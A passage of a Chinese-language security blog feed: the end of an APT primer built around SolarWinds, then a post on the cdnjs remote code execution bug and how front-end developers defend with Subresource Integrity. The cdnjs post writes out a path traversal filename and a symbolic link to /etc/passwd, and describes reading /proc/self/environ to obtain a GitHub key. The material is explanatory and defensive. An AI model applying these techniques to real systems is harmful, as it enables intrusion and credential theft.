有哪些階段</h3>\n<p>簡化來說可以分成五個階段<br>\n<strong>選擇目標：</strong><br>\n此階段有各種可能性，無論是因為企業曝光率高，或是競爭對手的僱傭甚至是網路曝險的資訊都有可能導致企業成為駭客的攻擊標的。</p>\n<p><strong>收集資訊：</strong><br>\n透過各式各樣的工具以及攻擊手法，收集攻擊目標可能導致風險的弱點。</p>\n<p><strong>執行滲透：</strong><br>\n嘗試將所有收集到的弱點串起，執行攻擊鍊達成階段性的目的，依據不同的最終目的，此階段的目標都可能不同，可能是獲取內部的帳號以及將帳號的權限提高，或者是控制防禦機制，也可能是植入後台收集資訊，或是將散播惡意腳本，此階段通常需要花費許多的時間進行持續性的測試，並且必須低調不能被發現。</p>\n<p><strong>分析資訊：</strong><br>\n藉由在內部中滲透後獲取的資料進行分析，此階段獲取的資訊有可能是透過帳號提權而獲得的資訊，又或者是埋入後門之後長期收集的資訊進行分析，也可能是漸進性的社交工程，由普通員工到人資到管理階層後收集到的資訊執行分析，確認這些資訊是否足夠讓駭客達成最終目的。</p>\n<p><strong>獲取成果：</strong><br>\n在這個階段就是大家在電影中所看到的，駭客敲擊幾分鐘的鍵盤，便看到系統被駭客完全掌控，或者是機密資料通通被下載備份。</p>\n<p><figure><img src=\"/img/posts/jo/zerobased-APT/p3.jpeg\" /><figcaption><p>photo by pexels</p>\n</figcaption></figure></p>\n<h3 id=\"%E5%AF%A6%E4%BE%8B%E8%AA%AA%E6%98%8E\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E4%BE%8B%E8%AA%AA%E6%98%8E\">#</a> 實例說明</h3>\n<p>以去年最有名的 SolarWinds 供應鏈攻擊來說明以上階段，這個攻擊事件受害者包括全球最大安全軟體公司之一FireEye以及美國財政部與商務部，以下引號為引用新聞內容，說明結束後會附上新聞連結。</p>\n<blockquote>\n<p>”SolarWinds自2020年3月到6月之間，推出的 Orion 軟體存在名為 SunBurst 的後門，駭客用來於遭感染的系統監控受害組織，同時能夠執行任意指令。“</p>\n</blockquote>\n<p><strong>選擇目標：</strong></p>\n<blockquote>\n<p>“SolarWinds是美國的軟體開發商，研發網路系統及資訊科技基礎設施的軟體，根據官網說明，客戶包括全美五百大企業中的425家、前十大電信業者、美國軍方、美國國防部、國務院、NSAS、國安局、郵政服務、司法部，以及美國總統辦公室。”</p>\n</blockquote>\n<p>這裏可以確定的是目標如果得手，等於間接獲取許多大企業的機敏資訊，至於為什麼會選擇 SolarWinds 就不得而知，有可能是透過層層的篩選目標，包含攻擊成功可能性以及網路曝險程度以及資料保護程度而定。</p>\n<p><strong>收集資訊：</strong></p>\n<p>如上一階段所說，此階段與<strong>選擇目標</strong>習習相關，舉例來說，駭客可能最初是鎖定了美國幾大知名的軟體開發商，接著透過各式各樣的工具以及攻擊手法，收集攻擊目標可能導致風險的弱點，去判斷攻擊成功可能性以及網路曝險程度以及資料保護程度之後，才選擇最終目標，接著再強化收集資訊。</p>\n<p><strong>執行滲透：</strong></p>\n<blockquote>\n<p>&quot; SolarWinds 於2019年10月推出的舊版本（2019.4.5200.8890版）裡，駭客已經開始對 Orion 的程式進行小幅度修改，加入了後來才用到的.NET類別（OrionImprovement BusinessLayer），而此時，駭客尚未植入後門的程式碼，ReversingLabs指 出，這個階段的程式碼竄改，很明顯只是概念性驗證攻擊（PoC）。<br>\n駭客大致的攻擊計畫，可區分成3個階段：首先，是駭入開發系統，一旦成功，攻擊者接著會注入自己的程式碼，最後查核他們簽署的軟體套件，是否會派送到 Orion 軟體的用戶端。<br>\n在駭客植入惡意程式碼的過程中，為了要瞞過  SolarWins 的開發人員，不讓攻擊行動被察覺，他們故步疑陣，採取了許多幾可亂真的做法，來模仿 SolarWinds 開發方式。<br>\n例如，在加入 Orion 程式碼的其中一個類別，其名稱駭客就刻意命名為 OrionImprovement BusinessLayer，而讓該公司的軟體開發者與稽核人員，認為是正常的物件。<br>\n駭客不只是模仿 SolarWinds 開發團隊的物件命名方式，ReversingLabs 進一步指出，駭客還在此類別中，引用了確實存在於 Orion 程式碼的方法（Method）與程式庫，而這樣的精細手法，同樣存在於這些駭客其他植入的方法。由此可見，駭客應該對於 SolarWinds 基礎程式庫的架構，可說是極為熟悉。“</p>\n</blockquote>\n<p>除了獲得駭入開發系統的權限，也許是透過社交工程或是透過服務逆向獲取權限，也可以看到駭客為了執行攻擊，花時間了解 SolarWinds 基礎程式庫的架構並模仿物件命名方式並引用確實存在於 Orion 程式碼的方法（Method）與程式庫，以上的攻擊都是需要花費許多的時間研究並且執行多次的測試才有可能成功。</p>\n<p><strong>分析資訊：</strong><br>\n在這個攻擊事件中，駭客在攻擊過程需要不斷的學習 SolarWinds 基礎程式庫的架構，並且確保自己的修改沒有被發現，不斷的執行 POC ，分析結果並確認攻擊的有效性，並且透過一次次的 POC ，從中獲得資訊，反覆的分析和修改攻擊手法。</p>\n<p><strong>獲取成果：</strong><br>\n最後在許多新聞報導及事件研究中可以看到，駭客除了獲取了 FireEye 的紅隊測試工具以外，也獲取了特定政府客戶的資料，並且也成功存取「部份」內部系統。</p>\n<p><strong>參考資料連接：</strong></p>\n<blockquote>\n<p><a href=\"https://www.ithome.com.tw/news/141651\">報導：國家級駭客透過供應鏈攻擊美國財政部與商務部</a><br>\n<a href=\"https://www.ithome.com.tw/news/141753\">資安廠商分析 SolarWinds 供應鏈攻擊後門程式，研判駭客自去年底開始攻擊</a></p>\n</blockquote>\n<p><figure><img src=\"/img/posts/jo/zerobased-APT/p4.jpeg\" /><figcaption><p>photo by pexels</p>\n</figcaption></figure></p>\n<h2 id=\"apt-%E6%9C%89%E8%BE%A6%E6%B3%95%E9%98%B2%E7%A6%A6%E5%97%8E%EF%BC%9F\"><a class=\"direct-link\" href=\"#apt-%E6%9C%89%E8%BE%A6%E6%B3%95%E9%98%B2%E7%A6%A6%E5%97%8E%EF%BC%9F\">#</a> APT 有辦法防禦嗎？</h2>\n<p>雖然 APT 攻擊有針對性而且客製化的特性，與一般防毒軟體與防火牆的偵測特徵碼的防護機制不盡相同，也因為擁有如此多型態和面向，所以對於企業來說十分難以預防，不過其實仍然能夠從幾個方面來提高駭客成功入侵的難度：</p>\n<ol>\n<li>對於威脅情資和漏洞資訊的了解，進行風險管理，掌握系統漏洞修補及軟體版本更新。</li>\n<li>針對企業內部所有的權限機制進行控管，細化每個人擁有的權限。</li>\n<li>執行事件記錄包括保留系統及檔案伺服器的存取紀錄，確保問題發生時，能第一時間發現並追蹤問題。</li>\n<li>執行如社交工程演練的資安測試及課程，強化全員資安意識。</li>\n<li>定期執行網路曝險以及弱點掃描、滲透測試等，確保企業對於自身服務以及狀態，除了提高駭客的攻擊難度以外，也能在層層篩選中避免成為最終標的。</li>\n</ol>\n<h2 id=\"%E5%B0%8F%E7%B5%90\"><a class=\"direct-link\" href=\"#%E5%B0%8F%E7%B5%90\">#</a> 小結</h2>\n<p>介紹了什麼是 APT ，也以實例說明流程之後，也許有人會產生這根本防不勝防的無力感，不過魔高一尺道高一丈，其實已經有組織分析了知名的駭客組織 APT 手法，並且將這些手法分類歸納，以此建立資安框架，除了將威脅和入侵的描述一致化以外，也有助攻防演練以及資安產品的驗證，而這其實也是我下一篇文章想要說明的重點，希望可以讓大家對於 APT 有更充分的了解，建立更豐富的資安知識庫。</p>\n<h2 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\">#</a> 延伸閱讀</h2>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-exposure/\">資安科普番外篇（一）-大意了啊沒有閃！常見網站曝險你中了幾項？！</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-fix/\">資安科普番外篇（二）-如何有效率選擇風險進行修復 feat.風險和法規息息相關？！</a></p>\n</blockquote>\n<h2 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\">#</a> 參考資料</h2>\n<blockquote>\n<p><a href=\"https://www.ithome.com.tw/news/141753\">資安廠商分析 SolarWinds 供應鏈攻擊後門程式，研判駭客自去年底開始攻擊</a></p>\n</blockquote>\n",
      "date_published": "2021-08-22T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/front-end-supply-chain-attack-cdnjs/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/front-end-supply-chain-attack-cdnjs/",
      "title": "從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<p>Supply chain attack，中文翻成供應鏈攻擊，這個手法瞄準了上游的漏洞進行攻擊，因為只要污染了上游，下游也會一併被污染。</p>\n<!-- summary -->\n<p>以前端為例，你使用的 npm 套件或是程式碼中引入的第三方 script，這些就叫做「上游」，在使用這些第三方資源的同時，你有意識到這也伴隨了一定的風險嗎？</p>\n<p>這篇文章會以 cdnjs 為例，帶大家看看前端的供應鏈攻擊與防禦。</p>\n<!-- summary -->\n<h2 id=\"cdnjs\"><a class=\"direct-link\" href=\"#cdnjs\">#</a> cdnjs</h2>\n<p>在寫前端的時候，常常會碰到許多要使用第三方 library 的場合，例如說 jQuery 或者是 Bootstrap 之類的（前者在 npm 上每週 400 萬次下載，後者 300 萬次）。先撇開現在其實大多數都會用 webpack 自己打包這點不談，在以往像這種需求，要嘛就是自己下載一份檔案，要嘛就是找現成的 CDN 來載入。</p>\n<p>而 cdnjs 就是其中一個來源，它的官網長這樣：</p>\n<p><figure><img src=\"/img/posts/huli/front-end-supply-chain-attack-cdnjs/cdnjs.png\" alt=\"cdnjs 截圖\"/><figcaption><p>圖片擷取自 <a href=\"https://cdnjs.com/\">cdnjs</a> 官網</p>\n</figcaption></figure></p>\n<p>除了 cdnjs，也有其他提供類似服務的網站，例如說在 <a href=\"https://jquery.com/download/\">jQuery</a> 官網上可以看見他們自己的 <a href=\"http://code.jquery.com\">code.jquery.com</a> ，而 <a href=\"https://getbootstrap.com/\">Bootstrap</a> 則是使用了另一個叫做 <a href=\"https://www.jsdelivr.com/\">jsDelivr</a> 的服務。</p>\n<p>舉個實際的例子吧！</p>\n<p>假設我現在做的網站需要用到 jQuery，我就要在頁面中用 <code>&lt;script&gt;</code> 標籤載入 jQuery 這個函式庫，而這個來源可以是：</p>\n<ol>\n<li>我自己的網站</li>\n<li>jsDelivr: <a href=\"https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js\">https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js</a></li>\n<li>cdnjs: <a href=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js\">https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js</a></li>\n<li>jQuery 官方：<a href=\"https://code.jquery.com/jquery-3.6.0.min.js\">https://code.jquery.com/jquery-3.6.0.min.js</a></li>\n</ol>\n<p>假設我最後選擇了 jQuery 官方提供的網址，就會寫下這一段 HTML：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://code.jquery.com/jquery-3.6.0.min.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>如此一來，就載入了 jQuery 這個函式庫，其他程式碼就可以使用它所提供的功能。</p>\n<p>那為什麼我要選擇 CDN，而不是選擇下載下來，放在自己的網站上呢？可能有幾個理由：</p>\n<ol>\n<li>懶惰，直接用別人的最快</li>\n<li>預算考量，放別人網站可以節省自己網站流量花費跟負荷</li>\n<li>速度考量</li>\n</ol>\n<p>第三點速度考量值得特別說明一下，如果載入的函式庫是來自於 CDN，下載的速度可能會比較快。</p>\n<p>比較快的第一個理由是他們本來就是做 CDN 的，所以在不同國家可能都有節點。假設你主機放在美國，那若是放自己網站，台灣的使用者就要連到美國的伺服器去抓這些 library，但如果是用 CDN 提供的網址，可能只要連到台灣的節點就好，省去一些延遲（latency）。</p>\n<p>第二個理由是如果大家都在用這個 CDN，那它被快取住的機率就提高了。例如說，假設 Facebook 也用了 cdnjs 來載入 jQuery 3.6.0 版，那如果我的網站也用了同樣的服務載入了同個 library，對於造訪過 Facebook 的瀏覽器來說，它就不需要再次下載檔案，因為已經下載過，被快取住了。</p>\n<p>（2021-08-09 補充：感謝 Ho Hong Yip 於文章發出後在臉書前端社群的指正，現在的瀏覽器對於快取多加了一個限制，也就是跨網站（更詳細一點說是根據 eTLD+1 來判斷）的快取將會分開。所以就算 Facebook 已經載入 jQuery 3.6.0，使用者造訪你的網站時還是需要再下載一次。更詳細的介紹可以看這篇：<a href=\"https://developers.google.com/web/updates/2020/10/http-cache-partitioning\">Gaining security and privacy by partitioning the cache</a>。如此一來，好像又少了一個用 public CDN 的理由了？但文末有提到 <a href=\"https://docs.google.com/document/d/1lQykm9HgzkPlaKXwpQ9vNc3m2Eq2hF4TY-Vup5wg4qg/edit\">Web Shared Libraries</a> 想解決這個問題，只是看起來還在早期階段。）</p>\n<p>以大家熟悉的 <a href=\"https://ithelp.ithome.com.tw/articles?tab=tech\">iT 邦幫忙</a>網站為例，就有使用到來自於 google 跟 cdnjs 的資源：</p>\n<p><img src=\"/img/posts/huli/front-end-supply-chain-attack-cdnjs/ithome.png\" alt=\"ithome\"></p>\n<p>前面講了一些使用第三方 CDN 的優點，那缺點是什麼呢？</p>\n<p>第一個缺點是如果 CDN 掛了，你的網站可能會跟著一起掛，就算不是掛掉，連線緩慢也是一樣。例如說我網站從 cdnjs 載入了 jQuery，可是 cdnjs 突然變得很慢，那我的網站也會變得很慢，一起被牽連。</p>\n<p>而 cdnjs 背後的公司 Cloudflare 確實有<a href=\"https://techcrunch.com/2019/06/24/cloudflare-outage-affecting-numerous-sites-on-monday-am/\">出過事</a>，連帶影響了許多網站。</p>\n<p>第二個缺點是如果 CDN 被駭客入侵了，你引入的函式庫被植入惡意程式碼，那你的網站就會跟著一起被入侵。而這樣子的攻擊手法，就是這篇的主題：「供應鏈攻擊」，從上游入侵，連帶影響到下游。</p>\n<p>有些人可能會想說：「這些大公司不太可能被入侵吧？而且這服務這麼多人用，一定有人在把關吧」</p>\n<p>接著，就讓我們來看一個實際案例。</p>\n<h2 id=\"%E8%A7%A3%E6%9E%90-cdnjs-%E7%9A%84-rce-%E6%BC%8F%E6%B4%9E\"><a class=\"direct-link\" href=\"#%E8%A7%A3%E6%9E%90-cdnjs-%E7%9A%84-rce-%E6%BC%8F%E6%B4%9E\">#</a> 解析 cdnjs 的 RCE 漏洞</h2>\n<p>2021 年 7 月 16 號，一名資安研究員 <a href=\"https://twitter.com/ryotkak\">@ryotkak</a> 在他的部落格上發布了一篇文章，名為：<a href=\"https://blog.ryotak.me/post/cdnjs-remote-code-execution-en/\">Remote code execution in cdnjs of Cloudflare</a>（以下用「作者」來稱呼）。</p>\n<p>Remote code execution 簡稱為 RCE，這種漏洞可以讓攻擊者執行任意程式碼，是風險等級很高的漏洞。而作者發現了一個 cdnjs 的 RCE 漏洞，若是有心利用這個漏洞的話，可以控制整個 cdnjs 的服務。</p>\n<p>作者的部落格文章把過程寫得十分詳細，我在這邊簡單講一下漏洞是怎麼形成的，一共有兩個漏洞。</p>\n<p>首先呢，Cloudflare 有把 cdnjs 相關的程式碼開源在 GitHub 上面，而其中有一個自動更新的功能引起了作者的注意。這個功能會自動去抓 npm 上打包好的 package 檔案，格式是壓縮檔 .tgz，解壓縮之後把檔案做一些處理，複製到合適的位置。</p>\n<p>而作者知道在 Go 裡面如果用 <code>archive/tar</code> 來解壓縮的話可能會有漏洞，因為解壓縮出來的檔案沒有經過處理，所以檔名可以長得像是這樣：<code>../../../../../tmp/temp</code></p>\n<p>長成這樣有什麼問題呢？</p>\n<p>假設今天你有一段程式碼是複製檔案，然後做了類似底下的操作：</p>\n<ol>\n<li>用目的地 + 檔名拼湊出目標位置，建立新檔案</li>\n<li>讀取原本檔案，寫入新檔案</li>\n</ol>\n<p>如果目的地是 <code>/packages/test</code>，檔名是 <code>abc.js</code>，那最後就會在 <code>/packages/test/abc.js</code> 產生新的檔案。</p>\n<p>這時候若是目的地一樣，檔名是 <code>../../../tmp/abc.js</code>，就會在 <code>/package/test/../../../tmp/abc.js</code> 也就是 <code>/tmp/abc.js</code> 底下寫入檔案。</p>\n<p>因此透過這樣的手法，可以寫入檔案到任何有權限的地方！而 cdnjs 的程式碼就有類似的漏洞，能夠寫入檔案到任意位置。如果能利用這漏洞，去覆蓋掉原本就會定時自動執行的檔案的話，就可以達成 RCE 了。</p>\n<p>當作者正想要做個 POC 來驗證的時候，突然很好奇針對 Git 自動更新的功能是怎麼做的（上面講的關於壓縮檔的是針對 npm 的）</p>\n<p>而研究過後，作者發現關於 Git repo 的自動更新，有一段複製檔案的程式碼，長這個樣子：</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">MoveFile</span><span class=\"token punctuation\">(</span>sourcePath<span class=\"token punctuation\">,</span> destPath <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">{</span><br>    inputFile<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Open</span><span class=\"token punctuation\">(</span>sourcePath<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Errorf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Couldn't open source file: %s\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><br>    outputFile<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Create</span><span class=\"token punctuation\">(</span>destPath<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>        inputFile<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Errorf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Couldn't open dest file: %s\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">defer</span> outputFile<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>    <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> err <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span><span class=\"token function\">Copy</span><span class=\"token punctuation\">(</span>outputFile<span class=\"token punctuation\">,</span> inputFile<span class=\"token punctuation\">)</span><br>    inputFile<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Errorf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Writing to output file failed: %s\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token comment\">// The copy was successful, so now delete the original file</span><br>    err <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Remove</span><span class=\"token punctuation\">(</span>sourcePath<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Errorf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed removing original file: %s\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>看起來沒什麼，就是複製檔案而已，開啟一個新檔案，把舊檔案的內容複製進去。</p>\n<p>但如果這個原始檔案是個 symbolic link 的話，就不一樣了。在繼續往下之前，先簡單介紹一下什麼是 symbolic link。</p>\n<p>Symbolic link 的概念有點像是以前在 Windows 上看到的「捷徑」，這個捷徑本身只是一個連結，連到真正的目標去。</p>\n<p>在類 Unix 系統裡面可以用 <code>ln -s 目標檔案 捷徑名稱</code> 去建立一個 symbolic link，這邊直接舉一個例子會更好懂。</p>\n<p>我先建立一個檔案，內容是 hello，位置是 <code>/tmp/hello</code>。接著我在當前目錄底下建立一個 symbolic link，指到剛剛建立好的 hello 檔案：<code>ln -s /tmp/hello link_file</code></p>\n<p>接著我如果印出 <code>link_file</code> 的內容，會出現 <code>hello</code>，因為其實就是在印出 <code>/tmp/hello</code> 的內容。如果我對 <code>link_file</code> 寫入資料，實際上也是對 <code>/tmp/hello</code> 寫入。</p>\n<p><img src=\"/img/posts/huli/front-end-supply-chain-attack-cdnjs/terminal.png\" alt=\"terminal\"></p>\n<p>再來我們試試看用 Node.js 寫一段複製檔案的程式碼，看看會發生什麼事：</p>\n<pre class=\"language-js\"><code class=\"language-js\">node <span class=\"token operator\">-</span>e <span class=\"token string\">'require(\"fs\").copyFileSync(\"link_file\", \"test.txt\")'</span></code></pre>\n<p>執行完成之後，我們發現目錄底下多了一個 <code>test.txt</code> 的檔案，內容是 <code>/tmp/hello</code> 的檔案內容。</p>\n<p>所以用程式在執行複製檔案時，並不是「複製一個 symbolic link」，而是「複製指向的檔案內容」。</p>\n<p>因此呢，我們剛剛提到的 Go 複製檔案的程式碼，如果有個檔案是指向 <code>/etc/passwd</code> 的 symbolic link，複製完以後就會產生出一個內容是 <code>/etc/passwd</code> 的檔案。</p>\n<p>我們可以在 Git 的檔案裡面加一個 symbolic link 名稱叫做 <code>test.js</code>，讓它指向 <code>/etc/passwd</code>，這樣被 cdnjs 複製過後，就會產生一個 test.js 的檔案，而且裡面是 <code>/etc/passwd</code> 的內容！</p>\n<p>如此一來，就得到了一個任意檔案讀取（Arbitrary File Read）的漏洞。</p>\n<p>講到這邊稍微做個總結，作者一共找到兩個漏洞，一個可以寫檔案一個可以讀檔案，寫檔案如果不小心覆蓋重要檔案會讓系統掛掉，因此作者決定從讀檔案開始做 POC，自己建了一個 Git 倉庫然後發佈新版本，等 cdnjs 去自動更新，最後觸發檔案讀取的漏洞，在 cdnjs 發布的 JS 上面就可以看到讀到的檔案內容。</p>\n<p>而作者讀的檔案是 <code>/proc/self/environ</code>（他本來是想讀另一個 <code>/proc/self/maps</code>），這裡面有著環境變數，而且有一把 GitHub 的 api key 也在裡面，這把 key 對 cdnjs 底下的 repo 有寫入權限，所以利用這把 key，可以直接去改 cdnjs 或是 cdnjs 網站的程式碼，進而控制整個服務。</p>\n<p>以上就是關於 cdnjs 漏洞的解釋，想看更多技術細節或是詳細發展的話，可以去看原作者的部落格文章，裡面記錄了許多細節。總之呢，就算是大公司在維護的服務，也是有被入侵的風險存在。</p>\n<p>而 Cloudflare 也在一週後發佈了事件處理報告：<a href=\"https://blog.cloudflare.com/cloudflares-handling-of-an-rce-vulnerability-in-cdnjs/\">Cloudflare's Handling of an RCE Vulnerability in cdnjs</a>，記錄了事情發生的始末以及事後的修補措施，他們把整個架構都重寫了，把原本解壓縮的部分放到 Docker sandbox 裡面，增加了整體的安全性。</p>\n<h2 id=\"%E8%BA%AB%E7%82%BA%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%B8%AB%EF%BC%8C%E8%A9%B2%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E8%BA%AB%E7%82%BA%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%B8%AB%EF%BC%8C%E8%A9%B2%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6%EF%BC%9F\">#</a> 身為前端工程師，該如何防禦？</h2>\n<p>那我們究竟該如何防禦這類型的漏洞？或搞不好，我們根本防禦不了？</p>\n<p>瀏覽器其實有提供一個功能：「如果檔案被竄改過，就不要載入」，這樣僅管 cdnjs 被入侵，jQuery 的檔案被竄改，我的網站也不會載入新的 jQuery 檔案，免於檔案污染的攻擊。</p>\n<p>在 cdnjs 上面，當你決定要用某一個 library 的時候，你可以選擇要複製 URL 還是複製 script tag，若是選擇後者，就會得到這樣的內容：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><br>    <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.production.min.js<span class=\"token punctuation\">\"</span></span><br>    <span class=\"token attr-name\">integrity</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>sha512-TS4lzp3EVDrSXPofTEu9VDWDQb7veCZ5MOm42pzfoNEVqccXWvENKZfdm5lH2c/NcivgsTDw9jVbK+xeYfzezw==<span class=\"token punctuation\">\"</span></span><br>    <span class=\"token attr-name\">crossorigin</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>anonymous<span class=\"token punctuation\">\"</span></span><br>    <span class=\"token attr-name\">referrerpolicy</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>no-referrer<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p><code>crossorigin=&quot;anonymous&quot;</code> 這個我在之前的文章：<a href=\"https://blog.huli.tw/2021/07/10/cookie-bomb/\">利用 Cookie 特性進行的 DoS 攻擊：Cookie 炸彈</a>有提過，利用 CORS 的方式送出 request，可以避免把 cookie 一起帶到後端去。</p>\n<p>而上面的另一個標籤 <code>integrity</code> 才是防禦的重點，這個屬性會讓瀏覽器幫你確認要載入的資源是否符合提供的 hash 值，如果不符合的話，就代表檔案被竄改過，就不會載入資源。所以，就算 cdnjs 被入侵了，駭客替換掉了我原本使用的 react.js，瀏覽器也會因為 hash 值不合，不會載入被污染過的程式碼。</p>\n<p>想知道更多的話可以參考 MDN，上面有一頁 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity\">Subresource Integrity</a> 專門在講這個。</p>\n<p>不過這種方法只能防止「已經引入的 script」被竄改，如果碰巧在駭客竄改檔案之後才複製 script，那就沒有用了，因為那時候的檔案已經是竄改過的檔案了。</p>\n<p>所以如果要完全避免這個風險，就是不要用這些第三方提供的服務，把這些 library 放到自己家的 CDN 上面去，這樣風險就從第三方的風險，變成了自己家服務的風險。除非自己家的服務被打下來，不然這些 library 應該不會出事。</p>\n<p>而現在許多網站因為 library 都會經由 webpack 這類型的 bundler 重新切分，所以沒有辦法使用第三方的 library CDN，一定會放在自己家的網站上，也就排除了這類型的供應鏈攻擊。</p>\n<p>可是要注意的是，你仍然避免不了其他供應鏈攻擊的風險。因為儘管沒有用第三方的 library CDN，還是需要從別的地方下載這些函式庫對吧？例如說 npm，你的函式庫來源可能是這裡，意思就是如果 npm 被入侵了，上面的文件被竄改，還是會影響到你的服務。這就是供應鏈攻擊，不直接攻擊你，而是從其他上游滲透進來。</p>\n<p>不過這類型的風險可以在 build time 的時候透過一些靜態掃描的服務，看能不能抓出被竄改的檔案或是惡意程式碼，或也有公司會在內部架一個 npm registry，不直接與外面的 npm 同步，確保使用到的函式庫不會被竄改。</p>\n<h2 id=\"%E9%A1%8D%E5%A4%96%E9%A2%A8%E9%9A%AA%EF%BC%9Acsp-%E7%9A%84%E7%B9%9E%E9%81%8E\"><a class=\"direct-link\" href=\"#%E9%A1%8D%E5%A4%96%E9%A2%A8%E9%9A%AA%EF%BC%9Acsp-%E7%9A%84%E7%B9%9E%E9%81%8E\">#</a> 額外風險：CSP 的繞過</h2>\n<p>除了上面提到的供應鏈安全風險以外，其實使用第三方 JS 還有另一個潛在風險，就是 CSP(Content Security Policy) 的繞過。現在有許多網站都會設置 CSP，阻擋不信任的來源，例如說只允許某個 domain 的 JS 檔案，或是不開放 inline event 跟 eval 等等。</p>\n<p>如果你的網站有用到 cdnjs 的腳本，你的 CSP 裡面勢必會有 <code>https://cdnjs.cloudflare.com</code> 這個網址。比起完整的路徑，比較多人會傾向允許整個 domain 的東西，因為你可能用到多個 